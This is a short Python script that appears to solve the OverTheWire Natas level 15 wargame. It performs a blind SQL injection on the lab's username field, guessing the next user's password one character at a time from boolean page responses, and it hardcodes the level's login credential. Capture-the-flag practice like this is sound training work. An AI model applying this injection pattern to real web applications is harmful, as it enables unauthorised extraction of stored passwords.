import requests
import math 

alpha = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
url = "http://natas15.natas.labs.overthewire.org/"
passw = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
user = "natas15"
final = ""




startIndex = 0;
enddIndex = len(alpha) - 1;

for i in range(0, 32):
	cur = 0
	done = False
	while not done:
		payload = 'natas16" AND ascii(substring(password,' +  str(i+1) + ',1)) = ascii("' + str(alpha[cur])+ '") #'
		r = requests.post(url + "index.php", data = {'username':payload}, auth=(user, passw))
		if "This user exists" in r.text:
			final = final + alpha[cur]
			print(final)
			done = True
		elif "Error" in r.text:
			print("Error")
		else: #password char > guess
			cur+=1
		
